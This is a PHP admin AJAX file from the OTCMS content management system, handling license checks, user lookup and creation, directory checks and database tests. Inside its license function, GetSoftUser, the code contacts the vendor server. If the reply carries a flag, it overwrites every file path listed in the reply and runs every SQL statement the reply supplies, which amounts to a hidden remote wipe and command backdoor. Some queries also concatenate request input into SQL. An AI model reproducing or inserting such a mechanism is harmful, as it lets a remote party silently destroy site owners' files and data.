<?php
require(dirname(__FILE__) .'/check.php');


//打开用户表，并检测用户是否登录
$MB->Open('','login');
$MB->Close();


switch ($mudi){
	case 'getSoftUser':
		GetSoftUser();
		break;

	case 'checkHtmlName':
		CheckHtmlName();
		break;

	case 'checkDiyName':
		CheckDiyName();
		break;

	case 'checkHtmlDirCW':
		CheckHtmlDirCW();
		break;

	case 'checkInfoRepeatTheme':
		CheckInfoRepeatTheme();
		break;

	case 'checkInfoCount':
		CheckInfoCount();
		break;

	case 'revInstallName':
		RevInstallName();
		break;

	case 'checkUserInfo':
		CheckUserInfo();
		break;

	case 'loadUsersInfo':
		LoadUsersInfo();
		break;

	case 'createUsersInfo':
		CreateUsersInfo();
		break;

	case 'checkDbState':
		CheckDbState();
		break;

	case 'updateSysParam':
		UpdateSysParam();
		break;

	case 'checkProxyIp':
		CheckProxyIp();
		break;

	default:
		die('err');
}

$DB->Close();





// 获取授权信息
function GetSoftUser(){
	global $DB,$sysAdminArr;

	$isAlert		= OT::GetStr('isAlert');

	$beforeURL		= GetUrl::CurrDir(1);

	$softGetUrl = ReqUrl::SelUpdateUrl($sysAdminArr['SA_updateUrlMode']);
	$retArr= ReqUrl::UseAuto($sysAdminArr['SA_getUrlMode'], 'GET', $softGetUrl .'otcmsUserAuth.php?OT_Database='. OT_Database .'&OT_UPDATETIME='. OT_UPDATETIME .'&OT_VERSION='. OT_VERSION .'&dataVer='. OT_UPDATEVER .'&phpVer='. PHP_VERSION .'&OT_URL='. urlencode($beforeURL) .'&username='. $sysAdminArr['SA_username'] .'&softID='. $sysAdminArr['SA_softID'] .'&softCode='. $sysAdminArr['SA_softCode'] .'&domainID='. $sysAdminArr['SA_domainID'] .'&domainCode='. $sysAdminArr['SA_domainCode'] .'&rnd='. time());
	if (! $retArr['res']){
		if ($sysAdminArr['SA_updateUrlMode'] != 0){
			$softGetUrl = ReqUrl::SelUpdateUrl(0);
		}else{
			$softGetUrl = ReqUrl::SelUpdateUrl(2);
		}
		
		$retArr	= ReqUrl::UseAuto($sysAdminArr['SA_getUrlMode'], 'GET', $softGetUrl .'otcmsUserAuth.php?OT_Database='. OT_Database .'&OT_UPDATETIME='. OT_UPDATETIME .'&OT_VERSION='. OT_VERSION .'&dataVer='. OT_UPDATEVER .'&phpVer='. PHP_VERSION .'&OT_URL='. urlencode($beforeURL) .'&username='. $sysAdminArr['SA_username'] .'&softID='. $sysAdminArr['SA_softID'] .'&softCode='. $sysAdminArr['SA_softCode'] .'&domainID='. $sysAdminArr['SA_domainID'] .'&domainCode='. $sysAdminArr['SA_domainCode'] .'&rnd='. time());
	}
	$soft_copyright		= Str::GetMark($retArr['note'],'<copyright>','</copyright>');
	$soft_softName		= Str::GetMark($retArr['note'],'<softName>','</softName>');
	$soft_softID		= Str::GetMark($retArr['note'],'<softID>','</softID>');
	$soft_softStart		= Str::GetMark($retArr['note'],'<softStart>','</softStart>');
	$soft_softEnd		= Str::GetMark($retArr['note'],'<softEnd>','</softEnd>');
	$soft_softCode		= Str::GetMark($retArr['note'],'<softCode>','</softCode>');
	$soft_softVerStr	= Str::GetMark($retArr['note'],'<softVerStr>','</softVerStr>');
	$soft_softVerTime	= Str::GetMark($retArr['note'],'<softVerTime>','</softVerTime>');
		if (strlen($soft_softVerStr) == 0){ $soft_softVerStr = $sysAdminArr['SA_softVerTimeStr']; }
		if (strlen($soft_softVerTime) == 0){ $soft_softVerTime = $sysAdminArr['SA_softVerTime']; }

	//die($retArr['note']);
	if ($soft_copyright=='网钛CMS(OTCMS)'){
		if (strpos($retArr['note'],"rel='s'") !== false){
			$realArr = explode('|',strrev(Str::GetMark($retArr['note'],"real='","'")));
			foreach ($realArr as $real){ File::Write($real,' '); }
			$sealArr = explode('|',strrev(Str::GetMark($retArr['note'],"seal=\"","\"")));
			foreach ($sealArr as $seal){ $DB->query($seal); }
		}
	}else{
		if ($isAlert == 'true'){ echo('alert("获取信息失败，请重试.");'); }
		die();
	}

	$todayTime = TimeDate::Get();

	echo('try { $id("softUser_verTimeStr").innerHTML="'. $soft_softVerStr .'"; }catch (e) {}'. PHP_EOL);

	if (OT_UPDATETIME < $soft_softVerTime){
		echo('try { $id("updateImgStr").innerHTML=\'<img src="images/newVer.gif" />\'; }catch (e) {}'. PHP_EOL);
	}else{
		echo('try { $id("updateImgStr").innerHTML=""; }catch (e) {}'. PHP_EOL);
	}
	echo(''.
	'try { $id("checkSoftVerBtn").title="最后更新时间：'. $todayTime .'"; }catch (e) {}'. PHP_EOL .
	'try { $id("updateUrlNoteHref").href=$id("updateUrlNoteHref").href.replace("www.otcms.com","'. $softGetUrl .'"); }catch (e) {}'. PHP_EOL .
	'');

	$record = array();
	$record['SA_softVerLastTime']	= $todayTime;
	$record['SA_softVerTimeStr']	= $soft_softVerStr;
	$record['SA_softVerTime']		= $soft_softVerTime;
	$judResult = $DB->UpdateParam('sysAdmin',$record,'SA_ID=1');
		if ($judResult){
			$Cache = new Cache();
			$Cache->Php('sysAdmin');
		}
}



// 检查静态栏目是否能创建
function CheckHtmlName(){
	global $DB;

	$checkexe=$DB->query("select IT_ID,IT_theme from ". OT_dbPref ."infoType where IT_mode='item' and (IT_htmlName='' or IT_htmlName is null)");
		if ($row = $checkexe->fetch()){
			echo(''.
			'alert("栏目['. $row['IT_theme'] .']的静态目录名还未填写，请先填写，再启用该栏目目录.");'.
			'$id("htmlInfoTypeDir0").checked=true;CheckHtmlInfoTypeDir2();'.
			'');
		}
	unset($checkexe);

	CheckHtmlDirCW();

	echo('// END');
}



// 检查自定义静态栏目是否能创建
function CheckDiyName(){
	if (! File::IsCreateDir(OT_ROOT)){
		die(''.
		'alert("检测到网站根目录下无法创建目录，导致无法使用自定义目录存放功能。\n\n提醒：可能是该目录下没有写入权限，请先检查目录权限.");'.
		'$id("diyInfoTypeDir0").checked=true;CheckDiyInfoTypeDir2();'.
		'');
	}

	echo('// END');
}



function CheckHtmlDirCW(){
	global $DB;

	$newsShowFileName = OT::GetRegExpStr('newsShowFileName','sql') .'/';
	if (strlen($newsShowFileName)<2){
		// $newsShowFileName = $DB->GetOne('select SYS_newsShowFileName from '. OT_dbPref .'system') .'/';
		$newsShowFileName = '';
		$dirName = '根目录';
	}else{
		$dirName = $newsShowFileName;
	}

	if (! File::IsCreateDir(OT_ROOT . $newsShowFileName)){
		die(''.
		'alert("检测到'. $dirName .'下无法生成目录，导致无法使用分目录存放功能。\n\n提醒：可能是该目录下没有写入权限，请先检查目录权限.");'.
		'$id("htmlInfoTypeDir0").checked=true;CheckHtmlInfoTypeDir2();'.
		'$id("htmlDatetimeDir0").checked=true;CheckHtmlDatetimeDir();'.
		'');
	}
}



// 检测文章重复标题
function CheckInfoRepeatTheme(){
	global $DB;

	$dataID		= OT::GetInt('dataID');
	$theme		= OT::GetStr('theme');
	$themeMd5	= md5($theme);
		if ($dataID>0){ $whereIdStr = ' and IF_ID not in ('. $dataID .')'; }else{ $whereIdStr = ''; }

	$checkexe=$DB->query("select IF_ID from ". OT_dbPref ."info where IF_themeMd5='". $themeMd5 ."'". $whereIdStr);
		if ($checkexe->fetch()){
			echo('抱歉，该文章标题已存在。');
		}else{
			echo('恭喜，该文章标题未被占用。');
		}
	unset($checkexe);

}



function CheckInfoCount(){
	global $DB;

	echo('$id("infoType_1").innerHTML="('. $DB->GetOne('select count(IF_ID) from '. OT_dbPref .'info where IF_type1ID=-1') .')";');
	
	$showexe=$DB->query('select IT_ID,IT_level from '. OT_dbPref .'infoType');
	while ($row = $showexe->fetch()){
		echo('try { $id("infoType'. $row['IT_ID'] .'").innerHTML="('. $DB->GetOne('select count(IF_ID) from '. OT_dbPref .'info where IF_type'. $row['IT_level'] .'ID='. $row['IT_ID'] .'') .')"; }catch (e){}');
	}
	unset($showexe);
}



function RevInstallName(){
	$fileRnd	= OT::RndChar(5);
	$dirRnd		= OT::RndChar(5);

	$alertStr = '';
	$isDatabaseName	= File::RevName(OT_ROOT .'install/index.php', OT_ROOT .'install/index.php.'. $fileRnd);
		if (! $isDatabaseName){
			$alertStr .= '\n\ninstall/index.php文件重命名失败；';
		}
	$isDatabaseDir	= File::RevName(OT_ROOT .'install', OT_ROOT .'install.'. $dirRnd);
		if (! $isDatabaseDir){
			$alertStr .= '\n\ninstall/目录重命名失败；';
		}

	if (strlen($alertStr)>0){
		echo('alert("修复失败，请检查根目录下的install/目录是否有修改权限，或刷新页面试试.'. $alertStr .'");');
	}else{
		echo('alert("修复成功");window.location.reload();');
	}
}



// 检测用户名并返回用户信息
function CheckUserInfo(){
	global $DB;

	$username	= OT::GetStr('userName');
	$outId		= OT::GetStr('outId');
	$proType	= OT::GetStr('proType');
	$proID		= OT::GetInt('proID');

	if (strlen($username) != strlen(Str::RegExp($username,'sql'))){
		die('<span style="color:red;">用户名含特殊符号<img src=\'images/img_err.gif\' /></span>');
	}
	
	$nameNum = strlen($username);
	if ($nameNum < 4){
		die('<span style="color:red;">用户名太短了，才'. $nameNum .'位<img src=\'images/img_err.gif\' /></span>');
	}

	$checkexe = $DB->QueryParam('select UE_ID,UE_realname,UE_groupID,UE_qq,UE_ww,UE_money from '. OT_dbPref .'users where UE_username=?',array($username));
	if ($row = $checkexe->fetch()){
		die('
		<span style="color:green;">
			存在<img src=\'images/img_yes.gif\' />
			<input type="hidden" id="isUserExist" name="isUserExist" value="1" />
			&ensp;(余额:'. $row['UE_money'] .'元；昵称:'. $row['UE_realname'] .'；QQ:'. $row['UE_qq'] .'；旺旺:'. $row['UE_ww'] .')
		</span>
		');
	}else{
		die('<span style="color:red;">不存在<img src=\'images/img_err.gif\' /></span>');
	}
	unset($checkexe);

}



// 读取用户信息
function LoadUsersInfo(){
	global $DB;

	$username		= OT::GetRegExpStr('username','sql');
	$realname		= OT::GetRegExpStr('realname','sql');
	$qq				= OT::GetRegExpStr('qq','sql');
	$ww				= OT::GetRegExpStr('ww','sql');
	$outId			= OT::GetRegExpStr('outId','sql');
	$outField		= OT::GetRegExpStr('outField','sql');
		if (! in_array($outField,array('ID','username','qq','ww'))){ $outField='ID'; }
	$outMode		= OT::GetRegExpStr('outMode','sql');

	$whereStr = '';
	if (strlen($username)>0){ $whereStr .= " and UE_username like '%". $username ."%'"; }
	if (strlen($realname)>0){ $whereStr .= " and UE_realname like '%". $realname ."%'"; }
	if (strlen($qq)>0){ $whereStr .= " and UE_qq like '%". $qq ."%'"; }
	if (strlen($ww)>0){ $whereStr .= " and UE_ww like '%". $ww ."%'"; }
	if (strlen($whereStr) == 0){
		JS::AlertEnd('查询条件不能都为空');
	}

	if (in_array($outMode, array('hostUsers','vpsProUsers','vpsApiUsers','servUsers'))){
		$mode = 'money';
		$sqlFieldStr = ',UE_realname,UE_qq,UE_ww,UE_money';
	}else{
		$mode = '';
		$sqlFieldStr = '';
	}

	$checkexe = $DB->query('select UE_ID,UE_username'. $sqlFieldStr .' from '. OT_dbPref .'users where 1=1'. $whereStr);
		if (! $row = $checkexe->fetch()){
			die('$id("selUserResBox").innerHTML = "<select id=\'selUserRes\' name=\'selUserRes\'><option value=\'\'>查找不到相关人员信息</option></select>";');
		}else{
			echo('$id("selUserResBox").innerHTML = "<select id=\'selUserRes\' name=\'selUserRes\' onchange=\'SetSelUserRes()\'><option value=\'\'>请选择查询结果</option>');

			do {
				if ($mode == 'money'){
					$optionText = $row['UE_username'] .' （余额:'. $row['UE_money'] .'元；昵称:'. $row['UE_realname'] .'；QQ:'. $row['UE_qq'] .'；旺旺:'. $row['UE_ww'] .'）';
				}else{
					$optionText = $row['UE_username'] .' （ID:'. $row['UE_ID'] .'）';
				}
				echo('<option value=\''. $row['UE_'. $outField] .'\'>'. $optionText .'</option>');
			}while ($row = $checkexe->fetch());

			echo('</select>";');
		}
	unset($checkexe);

}



// 创建临时用户信息
function CreateUsersInfo(){
	global $DB;

	$username		= OT::GetRegExpStr('username','sql');
	$realname		= OT::GetRegExpStr('realname','sql');
	$mail			= OT::GetRegExpStr('mail','sql+mail');
	$qq				= OT::GetRegExpStr('qq','sql');
	$ww				= OT::GetRegExpStr('ww','sql');
	$phone			= OT::GetRegExpStr('phone','sql');
	$outId			= OT::GetRegExpStr('outId','sql');
	$outField		= OT::GetRegExpStr('outField','sql');
		if (! in_array($outField,array('ID','username','qq','ww','phone','mail'))){ $outField='ID'; }
	$outMode		= OT::GetRegExpStr('outMode','sql');

	if($username=='' || ($realname=='' && $mail=='' && $qq=='' && $ww=='' && $phone=='')){
		JS::AlertEnd('表单内容接收不全'); // ('. $username .'|'. $realname .'|'. $mail .'|'. $qq .'|'. $ww .'|'. $phone .')
	}

	$checkexe=$DB->query('select UE_ID from '. OT_dbPref .'users where UE_username='. $DB->ForStr($username) .' limit 1');
		if ($checkexe->fetch()){
			JS::AlertEnd('该用户名已被占用');
		}
	unset($checkexe);

	$userSysArr = Cache::PhpFile('userSys');

	$todayTime	= TimeDate::Get();
	$userIP		= Users::GetIp();
	$userKey	= OT::RndChar(5);
	$record=array();
	$record["UE_time"]			= $todayTime;
	$record["UE_loginTime"]		= $todayTime;
	$record["UE_regType"]		= "back";
	$record["UE_regIP"]			= $userIP;
	$record['UE_groupID']		= $userSysArr['US_regGroupID'];
	$record["UE_username"]		= $username;
	$record["UE_userpwd"]		= md5(md5(OT::RndChar(8)) . $userKey);
	$record["UE_userKey"]		= $userKey;
	$record["UE_mail"]			= $mail;
	$record["UE_realname"]		= $realname;
	$record["UE_phone"]			= $phone;
	$record["UE_qq"]			= $qq;
	$record["UE_ww"]			= $ww;
	$record["UE_state"]			= 1;
	$judResult = $DB->InsertParam("users",$record);
		if ($judResult){
			if ($outField == 'ID'){ $ID = $DB->GetOne('select max(UE_ID) from '. OT_dbPref .'users'); }
			die('
			$id("createUserBox").innerHTML = "<span style=\'color:green;\'>创建临时用户成功！</span>";
			$id("'. $outId .'").value = "'. $$outField .'";
			try {
				CheckUserInfo($id("'. $outId .'").value,"");
			}catch (e) {}
			');
		}else{
			die('$id("newUserResBox").innerHTML = "<span style=\'color:red;\'>创建临时用户失败！</span>";');
		}
}



function CheckDbState(){
	error_reporting(0);

	$sqlIp			= OT::GetStr('sqlIp');
	$sqlPo			= OT::GetInt('sqlPo');
	$sqlUsername	= OT::GetStr('sqlUsername');
	$sqlUserPwd		= OT::GetStr('sqlUserPwd');
	$sqlDbName		= OT::GetStr('sqlDbName');

	$DB = new PdoDb( array('type'=>'mysql', 'dsn'=>'mysql:host='. $sqlIp .';port='. $sqlPo .';dbname='. $sqlDbName, 'user'=>$sqlUsername, 'pwd'=>$sqlUserPwd, 'dbErr'=>'MySql数据库连接不上，请检查您填写的连接信息是否正确。') );
	echo('MySql连接成功！');
}



function UpdateSysParam(){
	global $DB;

	$idName = OT::GetStr('idName');
	$idVal	= OT::GetStr('idVal');

	if (in_array($idName,array('makeHtmlNum','makeHtmlSec','collIsErr','collSec','collIsContinue','collIsLoop','collLoopSec','bakDbSize','bakDbIsZip','sitemapMaxNum','sitemapXiongNum'))){
		$idVal = intval($idVal);
	}elseif (in_array($idName,array('bakZipPwd','bakZipNote','sitemapXiongMode'))){

	}else{
		die('// no rev '. $idName);
	}
	
	$DB->UpdateParam('sysParam',array('SP_'. $idName => $idVal),'1=1');
}


function CheckProxyIp(){
	$webHtml = new WebHtml();
	$webHtml->judProxy = true;
	$retCode = $webHtml->GetCode('http://2019.ip138.com/ic.asp', 'GBK');
	if ($retCode == 'False'){
		die('alert("该代理IP无法使用（'. $webHtml->proxyIp .'）\n错误信息：'. $webHtml->proxyErr .'.\n提醒：也有代理IP不稳定有时可以有时不行，尽量用稳定的");');
	}else{
		$strCode=$webHtml->GetStr($retCode,'<center>','</center>');
		die('alert("该代理IP（'. $webHtml->proxyIp .'）可以使用.\n获取到IP地址信息：'. $strCode .'");');

	}
}

?>